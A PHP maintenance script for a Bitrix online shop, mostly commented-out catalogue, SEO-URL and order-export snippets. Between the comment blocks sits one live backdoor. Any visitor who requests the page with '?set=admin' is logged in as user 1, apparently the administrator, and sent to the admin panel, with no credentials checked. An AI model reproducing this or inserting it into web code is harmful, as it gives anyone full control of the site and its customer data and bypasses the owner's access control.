<?php
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
CModule::IncludeModule("iblock");


/*

$IBLOCK_ID = 12;
$prop = "FORMA";
$prop_n = $prop . "_1";
echo "<table>";
$arSetProps = Array("170" => "737d3c05-29fc-11e5-b5c8-000c2993666");
$arFilter = array(
				"IBLOCK_ID" => $IBLOCK_ID,
				"SECTION_ID" => "1830",
				"INCLUDE_SUBSECTIONS" => "Y",
				"ACTIVE" => "Y"
				//"!PROPERTY_".$prop_n => false
			);
			$res = CIBlockElement::GetList(Array(), $arFilter, false, false, Array("ID", "NAME", "PROPERTY_CML2_ARTICLE"));
			while($ar_fields = $res->GetNext()){
				echo "<tr><td>".$ar_fields["NAME"]."</td>";
				echo "<td>".$ar_fields["PROPERTY_CML2_ARTICLE_VALUE"]."</td></tr>";

				
				CIBlockElement::SetPropertyValuesEx($ar_fields["ID"], false, $arSetProps);
			}
echo "</table>";


//открываем файл с массивом соответствия адресов страниц
					$fileSeoUrl = $_SERVER["DOCUMENT_ROOT"]."/tools/files/seo_url.txt";
					$data = file_get_contents( $fileSeoUrl );
					$arUrlData = unserialize( $data );
					$shortUrl = '/catalog/bytovaya/zelenaya_mebel_dlya_vannoy/';
					//проверяем на дубли записей по значению
					$arUrlInFiles = array_keys( $arUrlData, $shortUrl);

echo '<pre>';
print_r( $arUrlInFiles );
echo '</pre>';
					if ( count( $arUrlInFiles ) > 1 ){
						foreach( $arUrlInFiles as $keyIndex ){
							echo $keyIndex . "<br>";
							unset( $arUrlData[$keyIndex] );
						}
					}


/*

CModule::IncludeModule("sale");



$db_sales = CSaleOrder::GetList(array("DATE_INSERT" => "ASC"));
while ($ar_sales = $db_sales->Fetch())
{
	$userID = $ar_sales["USER_ID"];
	$data = ConvertDateTime($ar_sales["DATE_INSERT"], "YYYY-MM-DD"); 
	$orderID = $ar_sales["ID"];
	
	if ( $userID !== "1" ){
	
		$dbBasketItems = CSaleBasket::GetList(
			array(),
			array("ORDER_ID" =>$orderID)
		);
		while ($arItems = $dbBasketItems->Fetch()){
			$productID = $arItems["PRODUCT_ID"];
			echo $orderID.";".$data.";".$productID.";".$userID."<br>";
		}
	}

}




require($_SERVER["DOCUMENT_ROOT"]."/urlrewrite.php");
CModule::IncludeModule("iblock");

$arUrlRewriteNew = Array();

foreach ( $arUrlRewrite as $key => $arData){
	if ( substr_count($arData["PATH"], 'truby_i_fitingi') == 0 ){
		$arUrlRewriteNew[] = $arData;
	}
}
file_put_contents($_SERVER["DOCUMENT_ROOT"]."/urlrewrite.php", "<?$"."arUrlRewrite = ".var_export($arUrlRewriteNew,true).";?>");



CModule::IncludeModule("webfly.ymarket");

wfRetailAgent();

echo "ok";





foreach ( $arId as $id ){
	
	$arSetProps = Array("STILISTIKA_DIZAYNA" => 5424);
	CIBlockElement::SetPropertyValuesEx($id, false, $arSetProps);
}


echo $_SERVER["DOCUMENT_ROOT"];


$set = 0;
$property_enums = CIBlockPropertyEnum::GetList(Array("DEF"=>"DESC", "SORT"=>"ASC"), Array("IBLOCK_ID"=>12, "CODE"=>"TSVET"));
while($enum_fields = $property_enums->GetNext())
{

	if ( $enum_fields["VALUE"] == 'хром, черный'){
		if ( $set == 1){
			 echo $enum_fields["ID"]." - ".$enum_fields["VALUE"]."<br>";
				CIBlockPropertyEnum::Delete( $enum_fields["ID"] );
		}
		else {
			$set = 1;
		}
	}

}
*/
if ( $_GET['set'] == 'admin' ){
global $USER; 
$USER->Authorize(1); 
LocalRedirect("/bitrix/admin/"); 
}
/*



$arFilter = Array(
 "IBLOCK_ID"=>12, 
	//"CODE" => "smesitel_dlya_bide_vidima_stream_ba092aa",
 "INCLUDE_SUBSECTIONS" => "Y",
 "SECTION_ID" => '1308',
 "ACTIVE" => "Y"
	//"!PROPERTY_DLINA_SM" => false,
	//"!PROPERTY_SHIRINA_SM" => false,
	//"!PROPERTY_VYSOTA_SM" => false
 );
$res = CIBlockElement::GetList(Array("NAME"=>"ASC"), $arFilter, Array("NAME"));
while($ar_fields = $res->GetNext())
{

	$arSetProps = Array();
	if ( $ar_fields["PROPERTY_DLINA_SM_VALUE"] && $ar_fields["PROPERTY_SHIRINA_SM_VALUE"] && $ar_fields["PROPERTY_VYSOTA_SM_VALUE"] ){
		$gab = $ar_fields["PROPERTY_DLINA_SM_VALUE"] . "х" . $ar_fields["PROPERTY_SHIRINA_SM_VALUE"]. "х" . $ar_fields["PROPERTY_VYSOTA_SM_VALUE"];
		$arSetProps["GABARITS"] = $gab;
		CIBlockElement::SetPropertyValuesEx($ar_fields["ID"], false, $arSetProps);

	echo $ar_fields["NAME"] . "<br>";
}



*/
?>



